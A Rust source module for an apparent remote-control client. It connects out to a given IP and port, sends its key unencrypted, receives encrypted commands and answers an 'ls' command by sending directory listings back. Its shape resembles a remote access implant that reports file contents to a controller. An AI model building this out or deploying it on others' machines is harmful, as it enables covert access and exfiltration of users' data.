use std::io::prelude::*;
use std::net::{TcpStream, Shutdown};
use std::io::BufReader;

use super::{utils, crypt, dir};

pub struct Sock {
    pub stream: TcpStream,
    pub key: String
}

impl Sock {

    pub fn listen(&mut self) -> String {
        let mut reader = BufReader::new(self.stream.try_clone().unwrap());
        let mut buf = "".to_owned();

        // Flush the buffer
        self.stream.flush().unwrap();

        // Read line
        reader.read_line(&mut buf).unwrap();

        // Remove newline
        buf = buf.replace("\n", "");

        // Return result
        return buf;
    }
    
    pub fn send(&mut self, msg: &String, nonce: &String) {
        let msg = &crypt::encrypt(msg, &self.key, &nonce);
        self.stream.write(format!("{msg}|{nonce}").as_bytes()).unwrap();
    }

    pub fn close(&mut self) {
        self.stream.shutdown(Shutdown::Both).unwrap();
    }

    pub fn manage(&mut self) {

        // Send our key
        self.stream.write(&self.key.as_bytes()).unwrap();

        // Manage the commands
        loop {
            let msg: String = self.listen();
            let values: Vec<&str> = msg.split("|").collect();

            let encrypted = values[0].to_owned();
            let sent_nonce = values[1].to_owned();
            
            let decrypted =  crypt::decrypt(&encrypted, &self.key, &sent_nonce);
            
            println!("Command: {}", decrypted);

            self.manage_command(decrypted);
        }
    }

    fn manage_command(&mut self, cmd: String) {
        let split: Vec<&str> = cmd.split(":").collect();

        let command = split[0];
        let value = &split[1].replace("\x08", "");

        match command {
            "ls" => self.get_directories(value),
            _ => self.send(&"Invalid Command".to_owned(), &utils::random_nonce())
        }
    }

    fn get_directories(&mut self, path: &str) {
        let directories = &dir::files_in_path(path);
        self.send(directories, &utils::random_nonce());
    }
    
}

pub fn connect(ip: &String, port: &String) -> TcpStream {
    TcpStream::connect(format!("{ip}:{port}")).unwrap()
}